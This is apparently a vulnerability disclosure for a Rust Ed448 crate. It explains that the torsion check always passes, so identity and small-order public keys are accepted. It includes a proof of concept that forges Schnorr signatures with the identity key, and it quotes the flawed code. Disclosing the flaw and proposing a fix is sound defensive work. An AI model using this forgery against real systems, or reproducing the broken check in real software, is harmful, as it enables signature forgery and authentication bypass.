### Title
Ed448 accepts small-order and identity points because its torsion check always succeeds, enabling Schnorr signature forgery - ([File: crypto/ed448/src/point.rs])

### Summary
`Point::is_torsion_free` attempts to compensate for the unrepresentable group order by evaluating `(Scalar::ZERO - Scalar::ONE) * P + P`. Since scalar arithmetic is modulo the subgroup order, `Scalar::ZERO - Scalar::ONE` is `-1`, not `order - 1`, so the expression is always `(-P) + P = identity`. Consequently, `Ed448::read_G` accepts the identity and other small-order points that the decoder intends to reject. [1](#0-0) [2](#0-1) 

### Finding Description
The Ed448 scalar field is defined modulo the prime subgroup order, so the subgroup order itself is encoded as zero and cannot be used as a nonzero scalar multiplier. [3](#0-2)  The code tries to work around that limitation with `Scalar::ZERO - Scalar::ONE`, analogous to trying to express an unavailable negative/off-by-one scaling factor, but modular reduction changes that value into `-1`. [4](#0-3) 

`Point::from_bytes` calls this always-true check after reconstructing `x` and rejecting only a negative-zero encoding. [5](#0-4)  `Ciphersuite::read_G` then accepts any canonical round-tripping point returned by `from_bytes`, including untrusted 57-byte encodings of the identity or small-order points. [2](#0-1) 

For an identity public key `A`, the Schnorr verification equation `R + cA - sG = 0` reduces to `R = sG`, regardless of the properly computed challenge. [6](#0-5)  The Ed448 challenge binds `R`, `A`, and the message, but that binding does not repair the degenerate verification equation when `A` is the identity. [7](#0-6) 

### Impact Explanation
An unprivileged party who can supply an Ed448 public-key encoding can submit the canonical identity encoding `01 || 00^56` and forge a valid Schnorr signature for any chosen message. Selecting `s = 1` and `R = G` causes verification to succeed under the real message-bound challenge because `cA` is always identity. This permits forged authentication/signatures in callers that parse attacker-controlled public keys before calling `SchnorrSignature::verify`. [5](#0-4) [6](#0-5) 

The issue also admits other small-order points, creating subgroup-confinement risks for protocols built on the `Ed448` ciphersuite, even though the test suite explicitly expects a known torsioned point to be rejected. [8](#0-7) 

### Likelihood Explanation
The attack only needs control over public bytes passed to `Ed448::read_G` and a subsequent signature verification; no private-key material, validator compromise, collusion, or protocol invalidation is required. Its practical reach is limited to deployments that enable the explicitly “not recommended” Ed448 ciphersuite or otherwise consume attacker-supplied Ed448 keys, so the likely rating is Medium rather than Critical or High. [9](#0-8) [2](#0-1) 

### Recommendation
Do not emulate multiplication by the subgroup order through a reduced `Scalar` expression. Implement subgroup-membership testing with a dedicated scalar-multiplication routine that can process the unreduced group order as an integer, or switch to a quotient-group encoding such as Decaf-style handling where canonical encodings inherently exclude torsion representatives. The identity should also be rejected explicitly for public-key inputs unless a specific protocol has a separately justified use for it. A regression test should deserialize the identity encoding and known torsioned point and assert rejection. [1](#0-0) [8](#0-7) 

### Proof of Concept
```rust
use ciphersuite::Ciphersuite;
use ff::Field;
use frost::{
  algorithm::{Hram, SchnorrSignature},
  curve::{Ed448, IetfEd448Hram},
};
use minimal_ed448::Scalar;

// Canonical Ed448 identity encoding: y = 1, sign = 0.
let mut identity_bytes = [0u8; 57];
identity_bytes[0] = 1;

// This should fail, but currently succeeds because is_torsion_free always
// evaluates (-P) + P == identity.
let public_key =
  Ed448::read_G::<&[u8]>(&mut identity_bytes.as_slice()).unwrap();

let r = <Ed448 as Ciphersuite>::generator();
let s = Scalar::ONE;
let message = b"attacker-controlled message";

// The real Ed448 HRAm binds R, the identity public key, and the message.
let challenge =
  <IetfEd448Hram as Hram<Ed448>>::hram(&r, &public_key, message);

let signature = SchnorrSignature::<Ed448> { R: r, s };

// R + cA - sG = G + c*identity - G = identity.
assert!(signature.verify(public_key, challenge));
```

### Citations

**File:** crypto/ed448/src/point.rs (L294-317)
```rust
impl Point {
  fn is_torsion_free(&self) -> Choice {
    ((*self * (Scalar::ZERO - Scalar::ONE)) + self).is_identity()
  }
}

impl GroupEncoding for Point {
  type Repr = <FieldElement as PrimeField>::Repr;

  fn from_bytes(bytes: &Self::Repr) -> CtOption<Self> {
    // Extract and clear the sign bit
    let sign = Choice::from(bytes[56] >> 7);
    let mut bytes = *bytes;
    let mut_ref: &mut [u8] = bytes.as_mut();
    mut_ref[56] &= !(1 << 7);

    // Parse y, recover x
    FieldElement::from_repr(bytes).and_then(|y| {
      recover_x(y).and_then(|mut x| {
        x.conditional_negate(x.is_odd().ct_eq(&!sign));
        let not_negative_zero = !(x.is_zero() & sign);
        let point = Point { x, y, z: FieldElement::ONE };
        CtOption::new(point, not_negative_zero & point.is_torsion_free())
      })
```

**File:** crypto/ed448/src/point.rs (L351-368)
```rust
#[test]
fn torsion() {
  use generic_array::GenericArray;

  // Uses the originally suggested generator which had torsion
  let old_y = FieldElement::from_repr(*GenericArray::from_slice(
    &hex::decode(
      "\
12796c1532041525945f322e414d434467cfd5c57c9a9af2473b2775\
8c921c4828b277ca5f2891fc4f3d79afdf29a64c72fb28b59c16fa51\
00",
    )
    .unwrap(),
  ))
  .unwrap();
  let old = Point { x: -recover_x(old_y).unwrap(), y: old_y, z: FieldElement::ONE };
  assert!(bool::from(!old.is_torsion_free()));
}
```

**File:** crypto/ciphersuite/src/lib.rs (L91-100)
```rust
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
```

**File:** crypto/ed448/src/scalar.rs (L8-23)
```rust
const MODULUS_STR: &str = concat!(
  "3fffffffffffffffffffffffffffffffffffffffffffffffffffffff",
  "7cca23e9c44edb49aed63690216cc2728dc58f552378c292ab5844f3",
);

impl_modulus!(ScalarModulus, U448, MODULUS_STR);
type ResidueType = Residue<ScalarModulus, { ScalarModulus::LIMBS }>;

/// Ed448 Scalar field element.
#[derive(Clone, Copy, PartialEq, Eq, Default, Debug)]
pub struct Scalar(pub(crate) ResidueType);

impl DefaultIsZeroes for Scalar {}

// 2**446 - 13818066809895115352007386748515426880336692474882178609894547503885
pub(crate) const MODULUS: U448 = U448::from_be_hex(MODULUS_STR);
```

**File:** crypto/schnorr/src/lib.rs (L88-109)
```rust
  pub fn batch_statements(&self, public_key: C::G, challenge: C::F) -> [(C::F, C::G); 3] {
    // s = r + ca
    // sG == R + cA
    // R + cA - sG == 0
    [
      // R
      (C::F::ONE, self.R),
      // cA
      (challenge, public_key),
      // -sG
      (-self.s, C::generator()),
    ]
  }

  /// Verify a Schnorr signature for the given key with the specified challenge.
  ///
  /// This challenge must be properly crafted, which means being binding to the public key, nonce,
  /// and any message. Failure to do so will let a malicious adversary to forge signatures for
  /// different keys/messages.
  #[must_use]
  pub fn verify(&self, public_key: C::G, challenge: C::F) -> bool {
    multiexp_vartime(&self.batch_statements(public_key, challenge)).is_identity().into()
```

**File:** crypto/frost/src/curve/ed448.rs (L20-34)
```rust
  pub(crate) fn hram(context: &[u8], R: &Point, A: &Point, m: &[u8]) -> Scalar {
    Scalar::wide_reduce(
      <Ed448 as Ciphersuite>::H::digest(
        [
          &[b"SigEd448".as_ref(), &[0, u8::try_from(context.len()).unwrap()]].concat(),
          context,
          &[R.to_bytes().as_ref(), A.to_bytes().as_ref(), m].concat(),
        ]
        .concat(),
      )
      .as_ref()
      .try_into()
      .unwrap(),
    )
  }
```

**File:** crypto/ed448/src/ciphersuite.rs (L53-63)
```rust
/// Ciphersuite for Ed448, inspired by RFC-8032. This is not recommended for usage.
///
/// hash_to_F is implemented with a naive concatenation of the dst and data, allowing transposition
/// between the two. This means `dst: b"abc", data: b"def"`, will produce the same scalar as
/// `dst: "abcdef", data: b""`. Please use carefully, not letting dsts be substrings of each other.
#[derive(Clone, Copy, PartialEq, Eq, Debug, Zeroize)]
pub struct Ed448;
impl Ciphersuite for Ed448 {
  type F = Scalar;
  type G = Point;
  type H = Shake256_114;
```
